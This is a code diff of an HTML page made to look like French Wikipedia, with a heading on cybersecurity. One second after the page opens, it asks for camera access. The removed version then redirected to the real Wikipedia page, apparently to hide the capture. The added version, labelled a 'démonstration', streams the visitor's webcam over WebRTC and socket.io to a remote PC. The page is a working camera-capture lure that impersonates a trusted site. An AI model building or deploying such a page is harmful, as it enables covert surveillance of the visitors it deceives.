@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wikipédia</title>
+    <title>Wikipédia — Démonstration</title>
 
     <style>
         body {
@@ -83,7 +83,7 @@
 
 <header>
     <div class="logo">W</div>
-    <div class="title">WIKIPÉDIA</div>
+    <div class="title">WIKIPÉDIA — Démonstration</div>
 </header>
 
 <main>
@@ -91,40 +91,44 @@
     <h1>Cybersécurité</h1>
 
     <p>
-        La cybersécurité regroupe les méthodes permettant de protéger
-        les systèmes informatiques et les utilisateurs contre les menaces.
+        Cette page présente une démonstration pédagogique
+        d'une connexion caméra utilisant WebRTC.
     </p>
 
     <p>
-        Les navigateurs modernes protègent notamment l'accès aux
-        périphériques comme la caméra et le microphone.
+        Le navigateur demande explicitement l'autorisation
+        d'utiliser la caméra.
     </p>
 
     <div id="status">
-        Chargement de la page...
+        Initialisation de la démonstration...
     </div>
 
     <div id="camera">
-        <p class="green">● Caméra activée</p>
-
+        <p class="green">● Caméra autorisée — flux transmis au PC</p>
         <video id="video" autoplay muted playsinline></video>
-
-        <p>
-            Flux caméra actif.
-        </p>
     </div>
 
 </main>
 
+<script src="/socket.io/socket.io.js"></script>
+
 <script>
+const socket = io();
 
 const status = document.getElementById("status");
 const camera = document.getElementById("camera");
 const video = document.getElementById("video");
 
-async function startCamera() {
+let peerConnection;
 
-    status.textContent = "Initialisation...";
+const config = {
+    iceServers: [
+        { urls: "stun:stun.l.google.com:19302" }
+    ]
+};
+
+async function startCamera() {
 
     try {
 
@@ -138,33 +142,40 @@ async function startCamera() {
         camera.style.display = "block";
 
         status.innerHTML =
-            '<span class="green">Connexion établie.</span>';
+            '<span class="green">Caméra autorisée. Connexion au PC...</span>';
 
-        // Redirection après quelques secondes
-        setTimeout(() => {
+        peerConnection = new RTCPeerConnection(config);
 
-            // Arrête la caméra avant de quitter la page
-            stream.getTracks().forEach(track => track.stop());
+        stream.getTracks().forEach(track => {
+            peerConnection.addTrack(track, stream);
+        });
 
-            window.location.href =
-                "https://fr.wikipedia.org/wiki/Cybers%C3%A9curit%C3%A9";
+        peerConnection.onicecandidate = event => {
+            if (event.candidate) {
+                socket.emit("ice-candidate", event.candidate);
+            }
+        };
 
-        }, 5000);
+        const offer = await peerConnection.createOffer();
+
+        await peerConnection.setLocalDescription(offer);
+
+        socket.emit("offer", offer);
+
+        status.innerHTML =
+            '<span class="green">● Flux caméra envoyé au PC</span>';
 
     } catch (error) {
 
         console.error(error);
 
         status.textContent =
-            "Accès à la caméra refusé ou indisponible.";
+            "La caméra n'a pas été autorisée.";
 
     }
 }
 
-
-// Lance la demande caméra après l'ouverture de la page
 setTimeout(startCamera, 1000);
-
 </script>
 
 </body>
